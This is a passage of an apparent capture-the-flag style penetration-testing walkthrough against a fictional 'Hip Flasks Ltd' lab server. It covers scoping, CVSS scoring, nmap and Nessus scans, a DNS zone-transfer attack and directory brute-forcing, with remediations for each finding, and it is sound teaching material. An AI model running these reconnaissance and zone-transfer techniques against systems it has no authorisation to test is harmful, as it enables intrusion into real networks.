```
Hip Flask is a beginner to intermediate level walkthrough. It aims to provide an in-depth analysis of the thought-processes involved in attacking an exposed webserver hosting a custom application in a penetration testing context.

Specifically, this room will look at exploiting a Python Flask application via two very distinctive flaws to gain remote code execution on the server. A simple privilege escalation will then be carried out resulting in full root access over the target.

The tasks in this room will cover every step of the attack process in detail, including providing possible remediations for the vulnerabilities found.  There are no explicit pre-requisites to cover before attempting this room; however, further resources will be linked at relevant sections should you wish further practice with the topic in question. That said, knowledge of Python and basic hacking fundamentals will come in handy. When in doubt: research!

Firefox is highly recommended for the web portion of this room. Use a different browser if you like, but be warned that any and all troubleshooting notes will be aimed at Firefox.

With that said, let's begin.

Before beginning an engagement, it is vitally important that both sides are completely clear about what will happen, and when it will happen. This effectively amounts to the client providing the pentester(s) with a list of targets, things to look out for, things to avoid, and any other relevant information about the assignment. In turn, the assessing team will establish whether the client's request is possible to fulfil, then either work with the client to find a more suitable scope or move on to arrange a period of time when the testing will be carried out. Additionally, the pentesters will also provide the client with the IP addresses the attacks will be coming from.

This process is referred to as "scoping".

Aside from the scoping meetings, the client will also provide the testing team with a point of contact in the company. This person will work with the team to some extent throughout the testing. In many cases this may simply be the person to reach out to should something go wrong; in other cases there may be daily, or even hourly reporting to this individual.

There are various types of penetration tests, and various methodologies with which these tests can be carried out. These methodologies can be placed on a sliding scale between black box and white box, with grey box in the middle. In a purely black box penetration test the assessing team will be given no information about the targets, aside from addresses or an address range to attack. In extreme cases the attackers may be given little more than the company name and be forced to determine the addresses for themselves. In short, the attackers start with no prior information and have to perform initial enumeration for themselves from the same starting position as a bad actor (a malicious hacker, or group of hackers, attacking the target without permission). This is good from a realism perspective, however, pentests are expensive and many companies do not wish to pay the assessors to sit around and perform initial footprinting of the organisation.

At the opposite end of the spectrum is white box penetration testing. As expected, in a white box penetration test, the attackers are given all relevant information about the target(s), which they can review in order to find vulnerabilities based on prior security knowledge and experience.

Most common are grey box tests where only some of the relevant information is provided by the client. The amount disclosed is dependent on the client and the target, meaning that a grey box test could fall anywhere on a sliding scale between white and black box tests.

The most common types of penetration test are web application and network pentests.

    Web application penetration testing revolves (as the name would suggest) around searching for vulnerabilities in web applications. In this style of assessment, the scope would provide the pentesters with a webapp (or multiple webapps) to work with. In a white box webapp pentest, the source code for the application would usually also be disclosed. Assessors would then attempt to find vulnerabilities in the application(s) over a period of time; often following a methodology such as that outlined in the OWASP Testing Guide. 
    
    Network pentests (often called Infrastructure pentests) can be further split into two categories: internal and external.
        External network pentests are when the client provides a public-facing endpoint (such as a VPN server or firewall) and asks the pentesters to assess it from the outside. Should the assessors succeed in gaining access, a further consultation with the client would be required to discuss an extension of the scope to include internal targets.
        Internal network pentests usually involve a pentester physically going to the client and attacking the network from on-site, although remote internal pentests where companies give the pentester remote access to a machine in the network (e.g. via VPN) are growing in popularity. These are relatively common as companies often want to test their active directory infrastructure. This kind of assessment is frequently grey box and starts from a position of assumed compromise. In other words, the attackers are provided with a low-privileged account with which they can start to poke around the network and see what they can use to escalate their privileges over the domain.

The scope for this room is as follows:

    There is one target: 10.10.177.36. This is the client's public-facing webserver.
    The machine is a cloned copy of the client's production server. Every service running on the machine is in scope.
    The target is hosted privately by the client at their headquarters. The target is owned entirely by the client. The client has the requisite authority to commission testing on the target.
    No further information will be given about the target.
    Assessors should attempt to find any and all vulnerabilities in the server, then report back to the client: Hip Flasks Ltd.


The client is the "Hip Flasks Ltd" company.

Note: this company is fictional and should not bear any resemblance to any real-world organisations now or in the future. Anything not on the TryHackMe network is absolutely out of scope.
Answer the questions below

We know that we are attacking a webserver, however, the entire server is in scope (not just ports 80 and 443), making this effectively a hybrid between a network and a webapp pentest.

Is the network portion internal or external? external
***Common Vulnerability Scoring System CVSS***
When a vulnerability is found in a target, there needs to be a standardised way of evaluating and judging the severity of vulnerabilities. Cue: CVSS.

The Common Vulnerability Scoring System is an open framework originally developed by the United States National Infrastructure Advisory Council (NIAC). It has since passed into the care of the Forum of Incident Response and Security Teams (FIRST); a global collaborative who have been maintaining the system since 2005. The short version is: the CVSS scoring system gives us a common method for calculating vulnerability scores which we can then share with a client. At the time of writing we are on version 3.1 of the scoring system.

The system works by giving the assessor a variety of options to do with the impact (working with the CIA triad: Confidentiality, Integrity, and Availability) and accessibility of the exploit (i.e. how easy it is to pull off), which it then uses to calculate a base score. When it comes to CVEs (Common Vulnerabilities and Exposures) -- one of the main standardised ways of disclosing vulnerabilities found in non-custom software and devices) -- the final score is adjusted over time depending on other factors, such as whether there is exploit code publicly available, and whether there are patches released for the exploit. This is referred to as temporal scoring. Exploits in custom applications tend to be a little more hit-and-miss with this scoring system, however, it is still very possible to use CVSS for these.

There is a calculator available here -- this was used to calculate the scores for the vulnerabilities showcased in this room.
The following table indicates the severity of each scoring range, as per the CVSSv3 specification:
Rank
	Score
Informational	0
Low	0.1 - 3.9
Medium	4.0 - 6.9
High	7.0 - 8.9
Critical	9.0 - 10.0

These severity ratings will be used in the vulnerability sections of this room.

Additionally, each vulnerability found may be assigned an arbitrary ID by assessors to aid with referencing throughout a report. In this room the ID format will be HF-VULN_MEDIUM-NUMBER, e.g. HF-NW-1 refers to the first network vulnerability found.

There is a lot more to the CVSS system than we will go into here, purely because going into how the calculations work in depth would require a full room (or an hour long lecture). That said, it is highly advised that you read the specification for CVSSv3, as this completely explains the inner workings of the system.

With the scope planned out, the day of the engagement is upon us!

It's time to start the testing. In hacking (as with everything), information is power. The more we know about the target, the more options we have available to us; thus we start with various kinds of enumeration.

We would often start with a passive footprinting stage before beginning the active enumeration that you may be familiar with. This would be time spent performing gathering OSINT (Open-Source Intelligence) about the target from their online footprint. For example, we may look for public email addresses, employee names, interesting subdomains / subdirectories in websites, Github repositories, or anything else that is publicly available and may come in handy. Tools like TheHarvester and the Recon-ng framework may come in handy for this.

┌──(kali㉿kali)-[~]
└─$ theHarvester -d tryhackme.com -l 500 -b google

*******************************************************************
*  _   _                                            _             *     
* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *     
* | __|  _ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *     
* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *     
*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *     
*                                                                 *     
* theHarvester 4.0.3                                              *     
* Coded by Christian Martorella                                   *     
* Edge-Security Research                                          *     
* cmartorella@edge-security.com                                   *     
*                                                                 *     
*******************************************************************     
                                                                        
                                                                        
[*] Target: tryhackme.com 
                                                                        
        Searching 0 results.
        Searching 100 results.
        Searching 200 results.
        Searching 300 results.
        Searching 400 results.
        Searching 500 results.
[*] Searching Google. 

[*] No IPs found.

[*] Emails found: 3
----------------------
first@tryhackme.com
hello@tryhackme.com
support@tryhackme.com

[*] Hosts found: 5
---------------------
admin.tryhackme.com:172.67.27.10, 104.22.55.228, 104.22.54.228
docs.tryhackme.com:185.199.109.153, 185.199.110.153, 185.199.111.153, 185.199.108.153
x22admin.tryhackme.com
x22docs.tryhackme.com
                      
Search from email addresses from a domain (-d kali.org), limiting the results to 500 (-l 500), using Google (-b google):
If this room was designed to be a full course then there would be publicly available information to scavenge for our fictional target company; however, as this is just a taster for the methodology (and a more in-depth introduction to some of the techniques later on!), we will skip the footprinting stage and assume that there is no public footprint to find. Instead we will start by enumerating the target server directly.

Fortunately we only have one target, so getting an initial idea of what we're dealing with technically speaking should be fairly simple. We'll start with a few port scans against the target to see what we're up against, then move on to some more probing vulnerability scans, followed by enumerating the available services in-depth.

**port scanning**
If you have done any of the boxes on TryHackMe then you should already be comfortable with portscanning.

What you may be less comfortable with is port scanning safely. In CTFs it is all too common to see people running Rustscan, or nmap with the -T5 and/or -A switches active. This is all well and good in a lab environment, but is less likely to go well in the real world. In reality, fast and furious enumeration is much more likely to damage a target unnecessarily (the point can be made that if a server is unable to stand up to a port scanner then it isn't fit for purpose, but do you really want to explain to the client and your boss why the company website has gone down?). The mantra "slow and steady wins the race", comes to mind. Realistically, in today's world anything other than a small, slow, home-brew port scanner will be picked up by most intrusion detection systems very quickly indeed; however, we may as well minimise our own footprint as much as possible.

Quick scans with a small scope can be used to get an initial idea of what's available. Slower scans with a larger scope can then be run in the background whilst you look into the results from the initial scans. The goal should be to always have something running in the background whilst you focus on something else ( a philosophy which shouldn't just apply to initial enumeration).

With that in mind, let's start some scans against the target. If you are not familiar with Nmap already, now would be a good time to complete the Nmap room.

Before we start scanning properly, try pinging the target. You should find that it doesn't respond to ICMP echo packets (i.e. pings timeout against it):

pentester@attacker:~$ ping -c 10.10.149.10
PING 10.10.149.10 (10.10.149.10) 56(84) bytes of data.

--- 10.10.149.10 ping statistics ---
5 packets transmitted, 0 received, 100% packet loss, time 4094ms


        

We know that the target is active, so this tells us that there is a firewall between us and the target -- a finding well worth bearing in mind as we progress with the assessment.

Time for some Nmap scans.

First and foremost, let's do a quick TCP SYN scan against the top 1000 most common TCP ports on the target. If not already running as root, we will do this with sudo so that we can use a SYN "Stealth" scan (which is default for the root user):
sudo nmap -vv 10.10.149.10 -oN Initial-SYN-Scan

We use -oN to write the results of this to a file in normal format. It is good practice to always save the results of our scans -- this means that we can refer to them later, and never need to repeat a scan.

Against this target, we should get four ports returned:
Initial Nmap Scan Results

           

pentester@attacker:~$ sudo nmap -vv 10.10.149.10 -oN Initial-SYN-Scan
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 01:26 BST
Initiating Ping Scan at 01:26
Scanning 10.10.149.10 [4 ports]
Completed Ping Scan at 01:26, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:26
Completed Parallel DNS resolution of 1 host. at 01:26, 0.01s elapsed
Initiating SYN Stealth Scan at 01:26
Scanning 10.10.149.10 [1000 ports]
Discovered open port 53/tcp on 10.10.153.187
Discovered open port 80/tcp on 10.10.153.187
Discovered open port 443/tcp on 10.10.153.187
Discovered open port 22/tcp on 10.10.153.187
Completed SYN Stealth Scan at 01:26, 0.66s elapsed (1000 total ports)
Nmap scan report for 10.10.149.10
Host is up, received syn-ack ttl 63 (0.032s latency).
Scanned at 2021-06-25 01:26:22 BST for 1s
Not shown: 996 closed ports
Reason: 996 resets
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
53/tcp  open  domain  syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.060KB)


        

As seen in the output, the four open ports are:
Service
	TCP Port Number
SSH
	22
DNS
	53
HTTP
	80
HTTPS
	443

Of these, 22, 80, and 443 are common for a Linux webserver. The DNS on TCP/53 is interesting. This would indicate that there is also a DNS server running on the host -- likely the authoritative nameserver for the domain. DNS on TCP port 53 is used for zone transfers, and as a backup should DNS requests to UDP/53 fail. In other words, we can also expect UDP/53 to be open.

Next, let's perform a service scan on these four ports, just to confirm that we are correct with the services:
Service Scan Results

           

pentester@attacker:~$ sudo nmap -p 22,53,80,443 -sV -Pn -vv 10.10.149.10 -oN service-scan
---
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
53/tcp  open  domain   syn-ack ttl 63 (unknown banner: Now why would you need this..?)
80/tcp  open  http     syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
443/tcp open  ssl/http syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.91%I=7%D=6/25%Time=60D52A5E%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,4B,"\0I\0\x06\x85\0\0\x01\0\x01\0\0\0\0\x07version\x04
SF:bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x1f\x1eNow\x20why\x20w
SF:ould\x20you\x20need\x20this\.\.\?");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
---


        

With the service scan we have identified OpenSSH version 8.2p1 for Ubuntu. Checking the Ubuntu package list tells us that this version currently only ships with Ubuntu Focal -- in other words, Ubuntu 20.04 LTS. Whilst this fingerprint could technically be spoofed, it is a good thing to note down regardless as the chances of this are low.

Port 53 has clearly had its fingerprint tampered with -- this is easy to do, and is often done in an attempt to obscure the version of the service. Given we know that this machine is very likely to be Linux, we can guess that the DNS server installed is most likely (statistically speaking) to be BIND (Berkeley Internet Name Domain). If this is the case then (despite the lack of an accurate fingerprint) we can also infer that the server version is at least 8.2, as this is when the option to change the banner was introduced. This is unfortunate, as before this point there were also a few serious vulnerabilities with this software.

Identifying the webserver as Nginx doesn't help us much, but again is useful to note down.

Already we have a pretty good idea of what might be happening with this server. Whilst a lot of what we just covered is guesswork based on most common software deployments, it's still useful to put it down tentatively as a working point, to be changed if contradicted later on.

Next let's perform a UDP scan on the target. UDP scans are notoriously slow, inaccurate, and inconsistent, so we won't spend a lot of time here. We do want to confirm that port 53 is open, so let's tell Nmap to scan the top 50 most common UDP ports and tell us which ones it thinks are open.

We get four results, only one of which is definitive:

UDP Scan Results

           

pentester@attacker:~$ sudo nmap -sU --top-ports 50 -Pn -vv --open  10.10.149.10 -oN udp-top-ports
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 02:14 BST
Initiating Parallel DNS resolution of 1 host. at 02:14
Completed Parallel DNS resolution of 1 host. at 02:14, 0.01s elapsed
Initiating UDP Scan at 02:14
Scanning 10.10.149.10 [50 ports]
Discovered open port 53/udp on 10.10.149.10
Increasing send delay for 10.10.149.10 from 0 to 50 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.149.10 from 50 to 100 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.149.10 from 100 to 200 due to max_successful_tryno increase to 6
Increasing send delay for 10.10.149.10 from 200 to 400 due to max_successful_tryno increase to 7
Increasing send delay for 10.10.149.10 from 400 to 800 due to max_successful_tryno increase to 8
Completed UDP Scan at 02:15, 51.83s elapsed (50 total ports)
Nmap scan report for 10.10.149.10
Host is up, received user-set (0.029s latency).
Scanned at 2021-06-25 02:14:35 BST for 52s
Not shown: 46 closed ports
Reason: 46 port-unreaches
PORT     STATE         SERVICE  REASON
53/udp   open          domain   udp-response ttl 63
68/udp   open|filtered dhcpc    no-response
631/udp  open|filtered ipp      no-response
5353/udp open|filtered zeroconf no-response

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 51.95 seconds
           Raw packets sent: 162 (10.544KB) | Rcvd: 50 (4.560KB)


        

Much like the filtered response from a TCP scan referring to a firewall in play, the open|filtered response in a UDP scan indicates a possible firewall. As the scan indicates, the three ports showing this state provided no response to the scan. This could mean that there is a firewall preventing access to the ports, or it could mean that the ports are open and just don't return a response (as is frequently the case with UDP). In short, UDP scans are not very accurate, but we have confirmed that UDP/53 is open.

To summarise, based on initial information, we know for sure that there are three services running: SSH on TCP port 22, DNS on TCP and UDP ports 53 (with a modified banner), and HTTP(S) on TCP ports 80 and 443.

This is enough to be getting on with for now.

We will move on from here; however, as a matter of good practice you should run a full port scan on a slower mode (e.g. -T2) against the TCP ports, and maybe a slightly wider UDP scan in the background. Be warned: these will not return anything new for this box.
**vulnerability scan**
With the initial enumeration done, let's have a look at some vulnerability scanning.

We could keep using Nmap for this (making use of the NSE -- Nmap Scripting Engine); or we could do the more common thing and switch to an industry-standard vulnerability scanner: Nessus.

Vulnerability scanners are used to scan a target (or usually a wide range of targets across a client network), checking for vulnerabilities against a central database. They will usually provide a list of discovered vulnerabilities, ranked from critical down to low or informational, with options to filter the results and export them into a report. There are a variety of vulnerability scanners available, including the opensource OpenVAS framework, however, Nessus is one of the most popular vulnerability scanners currently available when it comes to industry usage. Both OpenVas and Nessus have TryHackMe rooms dedicated to them already, so we will keep this section relatively short.

Unfortunately, due to licensing it is not possible to provide a machine with Nessus pre-installed. If you want to follow along with this section then you will need to download and install Nessus Essentials (the free version) for yourself. This is a relatively straight-forward process (which is covered in detail in the Nessus room), however, it can take quite a while! Nessus Essentials limits you significantly compared to the very expensive professional versions; however, it will do for our purposes here. This task is not essential to complete the room, so feel free to just read the information here if you would prefer not to follow along yourself.

The short version of the installation process is:

    Create a new Ubuntu VM (Desktop or Server, or another distro entirely). 40Gb hard disk space, 4Gb of RAM and 2 VCPUs worked well locally; however, you could probably get away with slightly less processing power for what we are using Nessus for here. A full list of official hardware requirements are detailed here, although again, these assume that you are using Nessus professionally.
    With the VM installed, go to the Nessus downloads page and grab an appropriate installer. For Ubuntu, Debian, or any other Debian derivatives, you are looking for a .deb file that matches up with your VM version (searching the page for the VM name and version -- e.g. "Ubuntu 20.04" -- can be effective here). Read and accept the license agreement, then download the file to your VM.
    Open a terminal and navigate to where you downloaded the package to. Install it with sudo apt install ./PACKAGE_NAME.
    This should install the Nessus server. You will need to start the server manually; this can be done with: sudo systemctl enable --now nessusd. This will permanently enable the Nessus daemon, allowing it to start with the VM, opening a web interface on https://LOCAL_VM_IP:8834.
    Navigate to the web interface and follow the instructions there, making sure to select Nessus Essentials when asked for the version. You will need a (free) activation code to use the server; this should be emailed directly from the server web interface. If that doesn't work then you can manually obtain an activation code from here.
    Allow the program some time to finish setting up, then create a username and password when prompted, and login!

We already have a target with 5 confirmed open ports, so let's get scanning it!

Before configuring the scan, make sure that your Nessus VM is connected to the TryHackMe network, either with your own VPN config file (disconnected from any other machines) or with a separate config file from another account.

With that done, we can start scanning.

Clicking "New Scan" in the top right corner leads us to a "Scan Templates" interface. From here we select "Advanced Scan":

Fill in a name and a description of your choosing, then add the IP address of the target (10.10.149.10) to the targets list:
Demonstration of filling out the general settings for an advanced scan

After setting the target, switch tabs to Discovery -> Host Discovery in the Settings menu for the scan and disable the "Ping the remote host" option. As previously established, this machine does not respond to ICMP echo packets, so there's no point in pinging it to see if it's up.

Next we head to Discovery -> Port Scanning in the Settings menu for the scan. Here we can tell Nessus to only scan the ports which we already found to be open:

At the bottom of the page we can now choose to save (or directly launch) the scan. Click the dropdown at the right hand side of the "Save" button and launch the scan.

The scan will take a few minutes to complete, and (at the time of writing) return two medium vulnerabilities, one low vulnerability, and 42 information disclosures. Clicking on the scan name from the "My Scans" interface will give us an overview of the findings:
Image showing the results from running the scan

As it happens, none of the findings are particularly useful to us in terms of exploiting the target further (both medium vulnerabilities being to do with the self-signed SSL cert for the server, and the low vulnerability relating to a weak cipher enabled on SSH); however, they would definitely be worth reporting to the client. Notice that the scores are given based on the CVSSv3 system.

We could run some more targeted scans, but otherwise we have now done all we can with Nessus at this stage. It may come in handy later on, should we find any SSH credentials, however.

Vulnerabilities:
ID
	Rank
	CVSS
	Vulnerability
	Remediation
HF-NW-1
	Medium
	6.4
	Untrusted, self-signed SSL certificates in use for HTTPS encryption.	Get an SSL certificate signed by a recognised authority for the webserver. Let's Encrypt will do this quickly, easily and for free.
HF-NW-2
	Low
	1.9
	Weak encryption method (Cipher Block Chaining -- CBC) in use for SSH encryption.	Disable the CBC mode cipher encryption on the OpenSSH server and replace it with the CTR or GCM encryption methods.

**webapp initial thoughts**
Of the three services available, the webserver is the one most likely to have vulnerabilities that Nessus couldn't find. As the client has not asked us to focus specifically on the webapp, but rather on the server as a whole, we will not do a deep-dive analysis on the website(s) being served by the webserver. We can always discuss adding a full web application pentest to the scope with the client later on.

Nginx is easy to misconfigure, and any custom webapps on the server could potentially have vulnerabilities that Nessus is unable to detect. At this point we don't know if Nginx is being used as a reverse proxy, or if it has its PHP engine installed and enabled.

Only one way to find out!

Navigating to the target IP address in Firefox gives us a message:
Host Name: 10.10.149.10, not found.
This server hosts sites on the hipflasks.thm domain.

This is the same for both the HTTP and HTTPS versions of the page.

Aside from the overly verbose error message (which in itself is unnecessary information exposure and should be rectified), we also learn that the client's domain appears to be hipflasks.thm. This is something we would likely already have known had we footprinted the client before starting the assessment. Additionally, we now know that the server expects a specific server name to be provided -- likely hipflasks.thm or a subdomain of it.

Testing for common subdomains is complicated considerably by the fact that this is not really a public webserver. The common solution in a CTF would be to just use the /etc/hosts file on Unix systems, or the  C:\Windows\System32\drivers\etc\hosts file on Windows, but this will become a collosal pain if there are lots of virtual hosts on the target. Instead, let's make use of the DNS server installed on the target.

Editing the system-wide DNS servers for a split-tunnel VPN connection like the one used for TryHackMe is, frankly, a colossal pain in the rear end. Fortunately there is an easier "hack" version using the FireFox config settings. This will only allow FireFox to use the DNS server, but right now that's all we need.

    Navigate to about:config in the FireFox search bar and accept the risk notice.
    Search for network.dns.forceResolve, double click it and set the value to the IP address of the target machine, then click the tick button to save the setting:
    Screenshot showing the network.dns.forceResolve setting in Firefox once set
    Note: You will need to replace this with your own Machine IP!

We should now be able to access anything on the hipflasks.thm domain through FireFox. Unfortunately, common subdomains such as www don't appear to be configured for the domain, so we're left either fuzzing for vhosts, or messing around with the DNS server.

Vulnerabilities:
ID
	Rank
	CVSS
	Vulnerability
	Remediation
HF-NW-3
	Informational
	0
	Unnecessary information disclosure in the catchall landing page for the Nginx server.	Remove the latter sentence of the custom error message so that only the "Host Name not found" message is shown.
    


We still don't actually know exactly what DNS server is in use here; however, there are very few current vulnerabilities in Linux DNS servers, so the chances are that if there's something to be found, it will be a misconfiguration.

Fortunately for us, misconfigurations in DNS are notoriously easy to make.

As the address system of the internet, it need not be said how important DNS is. As a result of this importance, it is good practice to have at least two DNS servers containing the records for a "zone" (or domain, in normal terms). This means that if one server goes down, there is still at least one other which contains the records for the domain; but this poses a problem: how do you update DNS records for the zone without having to go and update every server manually? The answer is something called a "Zone Transfer". In short: one server is set up as the "master" (or primary) DNS server. This server contains the primary records for the zone. In BIND9, zone configuration files for a primary server look something like this:
BIND Primary Zone Example Config

zone "example.com" IN {
    type master;
    file "/etc/bind/db.example.com";
    allow-query { any; };
    allow-transfer { 172.16.0.2; };
}


           
        

This defines a master zone for the domain example.com, it tells BIND to read the records from a file called /etc/bind/db.examples.com and accept queries from anywhere. Crucially, it also allows zone transfers to an IP address: 172.16.0.2.

In addition to the primary DNS server, one or more "slave" (or secondary) DNS servers are set up. They would have a zone file looking like this:
BIND Secondary Zone Example Config

zone "example.com" IN {
    type slave;
    file "/etc/bind/db.example.com";
    masters { 172.16.0.1; };
    allow-transfer { none; };
};


           
        

This defines a slave zone, setting the IP address of the primary DNS server in the masters {}; directive.

So, what are zone transfers? As you may have guessed, zone transfers allow secondary DNS servers to replicate the records for a zone from a primary DNS server. At frequent intervals (controlled by the Time To Live value of the zone), the secondary server(s) will query a serial number for the zone from the primary server. If the number is greater than the number that the secondary server(s) have stored for the zone then they will initiate a zone transfer, requesting all of the records that the primary server holds for that zone and making a copy locally.

In some configurations a "DNS Notify List" may also exist on the primary DNS server. If this is in place then the primary server will notify all of the secondary servers whenever a change is made, instructing them to request a zone transfer.

How can we weaponize this? Well, what happens if any of the servers don't specify which IP addresses are allowed to request a zone transfer? What if a DNS server has an entry in the zone config which looks like this: allow-transfer { any; };?

Rather than specifying a specific IP address (or set of IP addresses), the server allows any remote machine to request all of the records for the zone. Believe it or not, this misconfiguration is even easier to make in the Windows GUI DNS service manager.

This means that if the server is configured incorrectly we may be able to dump every record for the domain -- including the subdomains that we are looking for here!

Zone transfers are initiated by sending the target DNS server an axfr query. This can be done in a variety of ways, however, on Linux it is easiest to use either the dig or host commands:
dig axfr hipflasks.thm @10.10.149.10
or
host -t axfr hipflasks.thm 10.10.149.10

If the server is misconfigured to allow zone transfers from inappropriate places then both of these commands will return the same results, albeit formatted slightly differently. Namely a dump of every record in the zone.

Vulnerabilities:
ID
	Rank
	CVSS
	Vulnerability
	Remediation
HF-NW-4
	Medium	5.3
	DNS server is vulnerable to a Zone Transfer attack
	

Explicitly allow only recognised secondary DNS servers of the hipflasks.thm zone to perform axfr queries against the primary DNS server.
Answer the questions below

Attempt a zone transfer against the hipflasks.thm domain.

What subdomain hosts the webapp we're looking for? (This will be an "A" type record -- and not the one with www in it. ) hipper
┌──(kali㉿kali)-[~]
└─$ dig axfr hipflask.thm @10.10.149.10

; <<>> DiG 9.18.4-2-Debian <<>> axfr hipflask.thm @10.10.149.10
;; global options: +cmd
; Transfer failed.
                                                                         
┌──(kali㉿kali)-[~]
└─$ host -t axfr hipflasks.thm 10.10.149.10
Trying "hipflasks.thm"
Using domain server:
Name: 10.10.149.10
Address: 10.10.149.10#53
Aliases: 

;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 39113
;; flags: qr aa ra; QUERY: 1, ANSWER: 7, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;hipflasks.thm.                 IN      AXFR

;; ANSWER SECTION:
hipflasks.thm.          86400   IN      SOA     ns1.hipflasks.thm. localhost. 1 604800 86400 2419200 86400
hipflasks.thm.          86400   IN      NS      ns1.hipflasks.thm.
hipflasks.thm.          86400   IN      NS      localhost.
hipper.hipflasks.thm.   86400   IN      A       10.10.149.10
www.hipper.hipflasks.thm. 86400 IN      A       10.10.149.10
ns1.hipflasks.thm.      86400   IN      A       10.10.149.10
hipflasks.thm.          86400   IN      SOA     ns1.hipflasks.thm. localhost. 1 604800 86400 2419200 86400

Received 203 bytes from 10.10.149.10#53 in 199 ms

We already modified our FireFox configuration earlier to send all of our traffic to the target, so we should already be able to access that site on https://hipper.hipflasks.thm. That said, the configuration change we made previously (while very good for poking around an unknown webserver), can become annoying very quickly, so now may be a good time to reverse it and just add hipper.hipflasks.thm to your hosts file.

Note: As this target is not actually connected to the internet, you will need to accept the self-signed certificate by going to Advanced -> Accept in the warning page that pops up.

Website homepage

Having a look around the page and in the source code, there don't appear to be any working links, so if we want to access other pages then we will need to look for them ourselves. Of course, directory listing is disabled, which makes this slightly harder.

The source code does indicate the presence of assets/, assets/img/, css/, and js/ subdirectories, which seem to contain all of the static assets in use on the page:

---
        <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
        <!-- Font Awesome icons (free version)-->
        <script src="js/fa-all.js" crossorigin="anonymous"></script>
        <!-- Google fonts-->
        <link href="css/railway.css" rel="stylesheet" />
---
            <div class="container">
                <div class="intro">
                    <img class="intro-img img-fluid mb-3 mb-lg-0 rounded" src="assets/img/flask.jpg" alt="..." />
---

Having a look through some of the font stylesheets reveals that there is also an assets/fonts/ subdirectory. E.g., in css/railway.css:

@font-face {
  font-family: 'Raleway';
  font-style: italic;
  font-weight: 100;
  src: url(/assets/fonts/1Pt_g8zYS_SKggPNyCgSQamb1W0lwk4S4WjNDrMfJQ.ttf) format('truetype');
}

Nothing ground breaking so far, but we can start to build up a map of the application from what he have here:
/
|__assets/
|____imgs/
|____fonts/
|__css/
|__js/

With the initial looking around out of the way, let's have a look at the server itself. The Wappalyzer browser extension is a good way to do this, or, alternatively, we could just look at the server headers in either the browser dev tools or Burpsuite. Intercepting a request to https://hipper.hipflasks.thm/ in Burpsuite, we can right-click and choose to Do Intercept -> Response to this request:
Demonstration of selecting the Burpsuite Intercept Request

We should now receive the response headers from the server:
Server Response Headers

HTTP/1.1 200 OK
Date: Thu, 04 Aug 2022 23:07:50 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Server: waitress
Vary: Cookie
Front-End-Https: on
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Content-Length: 3608

A few things stand out here. First of all, the server header: waitress. This would normally be Nginx, as we already know from the TCP fingerprint that this is the webserver in use. This means that we are dealing with a reverse proxy to a waitress server. A quick Google search for "waitress web app" tells us that Waitress is a production-ready Python WSGI server -- in other words, we are most likely dealing with either a Django or a Flask webapp, these being the most popular Python web-development frameworks.

Secondly, there are various security-headers in play here -- however, notably absent are the Content-Security-Policy and X-XSS-Protection headers, meaning that the site may be vulnerable to XSS, should we find a suitable input field. Equally, the HSTS (Http Strict Transport Security) header which should usually force a HTTPS connection won't actually be doing anything here due to the self-signed certificate.

Before we go any further, let's start a couple of scans to run in the background while we look around manually. Specifically, let's go for Nikto and Feroxbuster (or Gobuster, if you prefer). Running in parallel (assuming you updated your hosts file):
        

┌──(kali㉿kali)-[~]
└─$ gobuster dir --url https://hipper.hipflasks.thm -w /usr/share/wordlists/dirb/common.txt -t 30 -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://hipper.hipflasks.thm
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/08/04 19:20:31 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 308) [Size: 274] [--> http://hipper.hipflasks.thm/admin/]
